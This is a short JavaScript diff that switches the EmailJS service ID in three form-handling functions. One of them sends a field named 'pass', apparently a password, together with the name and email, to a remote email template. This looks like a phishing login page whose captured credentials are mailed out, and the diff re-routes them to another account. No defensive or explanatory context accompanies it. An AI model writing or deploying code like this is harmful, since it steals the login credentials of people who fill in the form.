@@ -42,7 +42,7 @@ $(document).ready(function() {
   validate();
 
   function sendmail(name, email) {
-    emailjs.send("service_v1ffx4m","template_mvvfasr",{
+    emailjs.send("service_caq97ba","template_mvvfasr",{
 to_name: "None",
 from_name: name,
 message: email,
@@ -102,7 +102,7 @@ message: email,
   validate1();
 
   function sendmail1(name, email, pass) {
-    emailjs.send("service_v1ffx4m","template_mvvfasr",{
+    emailjs.send("service_caq97ba","template_mvvfasr",{
 to_name: pass,
 from_name: name,
 message: email,
@@ -161,7 +161,7 @@ message: email,
   validate2();
 
   function sendmail2(name, email) {
-    emailjs.send("service_v1ffx4m","template_mvvfasr",{
+    emailjs.send("service_caq97ba","template_mvvfasr",{
 to_name: "None",
 from_name: name,
 message: email,
